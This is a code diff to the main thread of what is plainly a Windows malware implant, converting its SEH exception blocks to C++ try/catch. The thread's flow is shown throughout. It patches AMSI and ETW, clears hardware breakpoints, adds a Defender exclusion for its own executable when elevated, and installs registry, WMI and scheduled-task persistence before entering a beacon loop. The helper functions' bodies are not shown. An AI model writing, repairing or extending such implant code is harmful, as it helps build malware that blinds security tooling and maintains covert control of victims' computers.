@@ -69,41 +69,33 @@ DWORD WINAPI ImplantThread(LPVOID) {
     DBG("DecoyLoop done");
 
     DBG("InitializeSyscalls");
-    __try {
+    try {
         int n = 0;
         while (!InitializeSyscalls()) {
             DBG("InitializeSyscalls fail attempt %d", ++n);
             if (n >= 5) return 1;
             NtSleep(5000);
         }
-    } __except(EXCEPTION_EXECUTE_HANDLER) {
-        DBG("InitializeSyscalls EXCEPTION 0x%08X", GetExceptionCode());
+    } catch(...) {
+        DBG("InitializeSyscalls EXCEPTION");
         return 1;
     }
     DBG("InitializeSyscalls ok");
 
-    __try { PatchAMSI(); } __except(EXCEPTION_EXECUTE_HANDLER) {
-        DBG("PatchAMSI EXCEPTION 0x%08X", GetExceptionCode());
-    }
-    __try { PatchETW(); } __except(EXCEPTION_EXECUTE_HANDLER) {
-        DBG("PatchETW EXCEPTION 0x%08X", GetExceptionCode());
-    }
-    __try { ClearHardwareBreakpoints(); } __except(EXCEPTION_EXECUTE_HANDLER) {
-        DBG("ClearHWBP EXCEPTION 0x%08X", GetExceptionCode());
-    }
+    try { PatchAMSI(); } catch(...) { DBG("PatchAMSI EXCEPTION"); }
+    try { PatchETW(); } catch(...) { DBG("PatchETW EXCEPTION"); }
+    try { ClearHardwareBreakpoints(); } catch(...) { DBG("ClearHWBP EXCEPTION"); }
     DBG("evasion done");
 
     wchar_t exePath[MAX_PATH] = {};
     GetModuleFileNameW(NULL, exePath, MAX_PATH);
 
     if (IsElevated()) {
-        __try { AddDefenderExclusion(exePath); } __except(EXCEPTION_EXECUTE_HANDLER) {
-            DBG("DefenderExclusion EXCEPTION 0x%08X", GetExceptionCode());
-        }
+        try { AddDefenderExclusion(exePath); } catch(...) { DBG("DefenderExclusion EXCEPTION"); }
     }
     DBG("defender exclusion done, elevated=%d", (int)IsElevated());
 
-    __try {
+    try {
         InstallRegistryPersistence(exePath);
         if (!IsWmiPersistenceInstalled()) {
             InstallWmiPersistence(exePath);
@@ -112,16 +104,16 @@ DWORD WINAPI ImplantThread(LPVOID) {
         if (!IsScheduledTaskInstalled()) {
             InstallScheduledTaskPersistence(exePath);
         }
-    } __except(EXCEPTION_EXECUTE_HANDLER) {
-        DBG("Persistence EXCEPTION 0x%08X (non-fatal)", GetExceptionCode());
+    } catch(...) {
+        DBG("Persistence EXCEPTION (non-fatal)");
     }
     DBG("persistence done");
 
     DBG("BeaconLoop start");
-    __try {
+    try {
         BeaconLoop();
-    } __except(EXCEPTION_EXECUTE_HANDLER) {
-        DBG("BeaconLoop EXCEPTION 0x%08X", GetExceptionCode());
+    } catch(...) {
+        DBG("BeaconLoop EXCEPTION");
         return 1;
     }
     DBG("BeaconLoop returned");
